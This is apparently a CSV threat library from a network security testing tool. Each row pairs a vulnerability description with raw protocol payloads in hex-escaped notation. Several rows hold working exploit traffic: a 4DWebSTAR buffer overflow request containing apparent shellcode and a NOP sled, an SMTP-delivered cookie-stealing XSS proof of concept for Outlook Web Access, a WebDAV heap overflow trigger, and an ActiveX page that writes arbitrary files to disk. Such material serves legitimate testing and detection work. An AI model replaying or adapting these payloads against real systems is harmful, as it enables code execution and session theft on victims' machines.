XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿4dwebstar.xml,4DWebSTAR Buffer Overflow,"This threat causes a buffer overflow in the 4DWebSTAR Tomcat Plugin service. This service is part of a webserver, which typically listens on port 80.",HTTP,TCP,"GET /````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````||7C ||c||1A ||y@||82 FF FD ||}||A8 02 A6 ||8||C3 E1 ||59||80 01 18 ||9||AD 1F FF 81 CD E1 ||9||81 ED E1 ||5}||EF ||rx||91 ED E1 ||5||7C 06 ||h||AC 7C 01 04 AC 7C 06 ||o||AC ||L||01 01 ||,9||AD FF FC ||9||8C FF FB ||}||8C ||cy@||82 FF D8 3B E0 ||0||FF ||||E0 ||NpD||FF FF 02 7C ||c||1A ||y||7C ||c||1A ||y||7C ||c||1A ||y||10 ||)%||CB 10 C9 ||%||C8 10 E9 ||%||CF 10 ||I%||A8 ||lI%||CB ||TI'||B1 ||T7>||B1 ||`I%||C4 ||(K>||F0 ||(I%||C9 ||T||C1 ||'o||10 E9 ||%||D9 10 ||I%||A1 ||W||8A D6 B1 ||lI%||CB ||TI'||B1 10 ||I%||A3 ||W||8A D6 B1 ||lI%||CB ||TI'||B1 ||W||8A D6 B1 10 ||I%||D7 10 C9 ||%||D9 B8 C8 DA ||!||10 E8 DA ||!||10 C8 DA ||9lI%||CB ||TI'||B1 ||T7>||B1 10 E9 ||%||CB 10 ||I%||93 ||W||8A D6 B1 ||T||ED 0E B1 ||lI%||CB ||TI'||B1 10 EC DA ||6||04 ||L||DA ||6h||CB DA ||,||10 ||I%||8B ||lI%||CB ||TI'||B1 ||T||EC 0F B0 ||h||CB DA ||4T!'o||10 ||*%||E1 B8 ||(||DA ||1||B8 E8 DA ||5||10 C8 DA ||1||10 ||I%||F2 ||TI!elI%||CB ||TI'||B1 ||W||A9 ||%||C1 07 ||+L||A7 07 ||*V||A1 ||(I%||C9 ||(I%||C9 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 84 FE 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 85 14 04 02 || HTTP/1.1||0D 0A 0D 0A||"
4dwebstar.xml,4DWebSTAR Buffer Overflow,"This threat causes a buffer overflow in the 4DWebSTAR Tomcat Plugin service. This service is part of a webserver, which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿FSC20060613-22_Microsoft_Exchange_Server_Outlook_Web_Access_Script_Injection.xml,Microsoft Exchange Server Outlook Web Access Script Injection,A script injection vulnerability exists in Microsoft Exchange Servers running Outlook Web Access. The vulnerability is caused by improper sanitization of e-mail messages which contain script code when they are read through Outlook Web Access. A malicious user may exploit this flaw to inject and execute HTML and script code in the security context of the target user's browser session.,SMTP,TCP,EHLO 10.2.8.55||0D 0A||
FSC20060613-22_Microsoft_Exchange_Server_Outlook_Web_Access_Script_Injection.xml,Microsoft Exchange Server Outlook Web Access Script Injection,A script injection vulnerability exists in Microsoft Exchange Servers running Outlook Web Access. The vulnerability is caused by improper sanitization of e-mail messages which contain script code when they are read through Outlook Web Access. A malicious user may exploit this flaw to inject and execute HTML and script code in the security context of the target user's browser session.,SMTP,TCP,MAIL FROM||3A || <poc@proof.of.concept.com>||0D 0A ||RCPT TO||3A || <test@srv.gsx4>||0D 0A ||DATA||0D 0A ||From||3A || ||22 ||poc||22 || <poc@proof.of.concept.com>||0D 0A ||To||3A || <test@srv.gsx4@10.2.8.55>||0D 0A ||Subject||3A ||XSS Poc||0D 0A ||Content-Type||3A || text/html||0D 0A 0D 0A ||<img color='in||00 ||valid' alt='Mouse Here.' onMouseOver='javascript||3A ||alert(document.cookie)'>||0D 0A ||.||0D 0A||
FSC20060613-22_Microsoft_Exchange_Server_Outlook_Web_Access_Script_Injection.xml,Microsoft Exchange Server Outlook Web Access Script Injection,A script injection vulnerability exists in Microsoft Exchange Servers running Outlook Web Access. The vulnerability is caused by improper sanitization of e-mail messages which contain script code when they are read through Outlook Web Access. A malicious user may exploit this flaw to inject and execute HTML and script code in the security context of the target user's browser session.,SMTP,TCP,"220 2kSrvExchng2003.Srv.GSX4 Microsoft ESMTP MAIL Service, Version||3A || 5.0.2195.6713 ready at  Wed, 28 Jun 2006 16||3A ||08||3A ||07 -0400 ||0D 0A ||250-2kSrvExchng2003.Srv.GSX4 Hello [10.2.1.60]||0D 0A ||250-TURN||0D 0A ||250-ATRN||0D 0A ||250-SIZE||0D 0A ||250-ETRN||0D 0A ||250-PIPELINING||0D 0A ||250-DSN||0D 0A ||250-ENHANCEDSTATUSCODES||0D 0A ||250-8bitmime||0D 0A ||250-BINARYMIME||0D 0A ||250-CHUNKING||0D 0A ||250-VRFY||0D 0A ||250-X-EXPS GSSAPI NTLM LOGIN||0D 0A ||250-X-EXPS=LOGIN||0D 0A ||250-AUTH GSSAPI NTLM LOGIN||0D 0A ||250-AUTH=LOGIN||0D 0A ||250-X-LINK2STATE||0D 0A ||250-XEXCH50||0D 0A ||250 OK||0D 0A||"
﻿FSC20080212-10_Microsoft_Windows_WebDAV_Mini.xml,Microsoft Windows WebDAV Mini-Redirector Heap Buffer Overflow,"A vulnerability has been reported in the WebDAV Mini-Redirector component of Microsoft Windows. The flaw can be triggered during the processing of WebDAV responses, causing a heap overflow. An attacker can exploit this vulnerability by persuading the target user to connect to a malicious WebDAV server. A successful attack could lead to arbitrary code execution in the SYSTEM security context.",HTTP,TCP,"GET /~blin/poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1||3B || SV1)||0D 0A ||Host||3A || 172.16.1.2||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20080212-10_Microsoft_Windows_WebDAV_Mini.xml,Microsoft Windows WebDAV Mini-Redirector Heap Buffer Overflow,"A vulnerability has been reported in the WebDAV Mini-Redirector component of Microsoft Windows. The flaw can be triggered during the processing of WebDAV responses, causing a heap overflow. An attacker can exploit this vulnerability by persuading the target user to connect to a malicious WebDAV server. A successful attack could lead to arbitrary code execution in the SYSTEM security context.",HTTP,TCP,"||00 00 00 00 00 00 ||HTTP/1.1 200 OK||0D 0A ||Date||3A || Fri, 15 Feb 2008 19||3A ||06||3A ||11 GMT||0D 0A ||Server||3A || Apache/2.0.52 (CentOS) PHP/4.3.9 mod_python/3.1.3 Python/2.3.4 mod_perl/2.0.1 Perl/v5.8.5||0D 0A ||Last-Modified||3A || Fri, 15 Feb 2008 19||3A ||01||3A ||24 GMT||0D 0A ||ETag||3A || ||22 ||db0483-f4-8586900||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 244||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<head>||0D 0A ||<object>test<p>||0D 0A ||<style>test</style>||0D 0A ||<style>test</style>||0D 0A ||<isindex>||0D 0A ||<style>test</style>||0D 0A ||</object>||0D 0A ||</head>||0D 0A ||<body>||0D 0A ||<br>||0D 0A ||Copyright Assurent Secure Technologies, a Telus Company<br>||0D 0A ||All Rights Reserved <br>||0D 0A ||</body>||0D 0A ||</html>||00 00 00 00 00 00||"
﻿FSC20080311-17_Microsoft_Office_Web_Components_DataSource_Code_Execution.xml,Microsoft Office Web Components DataSource Code Execution,"There exists a file creation vulnerability in Microsoft Web Components Control ActiveX control. The flaw is due to lack of path verification in the control's DataSource. A remote attacker may exploit this vulnerability via a specially crafted web page to create arbitrary files on the target system. After successfully exploiting this vulnerability, a file on the target file system might be created. An attacker may write a file to the start up folder in order to execute arbitrary code during the next reboot or logon session to gain access to the system. Thus, the behaviour of the target depends on the intention of the attacker. Note that file overwrites are not possible using this vulnerability.",HTTP/HTTPS,TCP,"GET /~hsafyallah/poc.html HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||If-Modified-Since||3A || Tue, 18 Mar 2008 15||3A ||24||3A ||11 GMT||0D 0A ||If-None-Match||3A || ||22 ||6147da-2c1-ba709cc0||22 0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.0)||0D 0A ||Host||3A || sticky||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20080311-17_Microsoft_Office_Web_Components_DataSource_Code_Execution.xml,Microsoft Office Web Components DataSource Code Execution,"There exists a file creation vulnerability in Microsoft Web Components Control ActiveX control. The flaw is due to lack of path verification in the control's DataSource. A remote attacker may exploit this vulnerability via a specially crafted web page to create arbitrary files on the target system. After successfully exploiting this vulnerability, a file on the target file system might be created. An attacker may write a file to the start up folder in order to execute arbitrary code during the next reboot or logon session to gain access to the system. Thus, the behaviour of the target depends on the intention of the attacker. Note that file overwrites are not possible using this vulnerability.",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 18 Mar 2008 16||3A ||12||3A ||29 GMT||0D 0A ||Server||3A || Apache/2.0.52 (CentOS) PHP/4.3.9 mod_python/3.1.3 Python/2.3.4 mod_perl/2.0.1 Perl/v5.8.5||0D 0A ||Last-Modified||3A || Tue, 18 Mar 2008 15||3A ||25||3A ||55 GMT||0D 0A ||ETag||3A || ||22 ||61473e-2c2-c0a386c0||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 706||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A||"
FSC20080311-17_Microsoft_Office_Web_Components_DataSource_Code_Execution.xml,Microsoft Office Web Components DataSource Code Execution,"There exists a file creation vulnerability in Microsoft Web Components Control ActiveX control. The flaw is due to lack of path verification in the control's DataSource. A remote attacker may exploit this vulnerability via a specially crafted web page to create arbitrary files on the target system. After successfully exploiting this vulnerability, a file on the target file system might be created. An attacker may write a file to the start up folder in order to execute arbitrary code during the next reboot or logon session to gain access to the system. Thus, the behaviour of the target depends on the intention of the attacker. Note that file overwrites are not possible using this vulnerability.",HTTP/HTTPS,TCP,"<HTML>||0D 0A ||<Head> POC for Microsoft Office Web Components vulnerability</Head>||0D 0A ||<Body>||0D 0A ||<br>Copyright Assurent Secure Technologies, a Telus Company<br>||0D 0A ||All Rights Reserved <br><br>||0D 0A ||<object classid = 'clsid||3A ||0002E530-0000-0000-C000-000000000046' id= 'ctrl'></object>||0D 0A ||<script>||0D 0A 0D 0A 09 ||ctrl.ConnectionString= ||22 ||Provider=Microsoft.Jet.OLEDB.4.0||3B ||Data Source=C||3A ||\\||3B ||Extended Properties=\||22 ||text||3B ||HDR=NO||3B ||FMT=Delimited(\n)\||22 22 3B 0D 0A 09 ||ctrl.Connection.Execute(||22 ||Create Table  poc.txt (a varchar(255))||22 ||)||0D 0A 09 ||ctrl.Connection.Execute(||22 ||Insert into poc.txt (a) values ('POC for Microsoft Office Web Components vulnerability\r\nCopyright Assurent Secure Technologies, a Telus Company\nAll Rights Reserved')||22 ||)||0D 0A 0D 0A ||</script>||0D 0A ||</Body>||0D 0A ||</HTML>||0D 0A||"
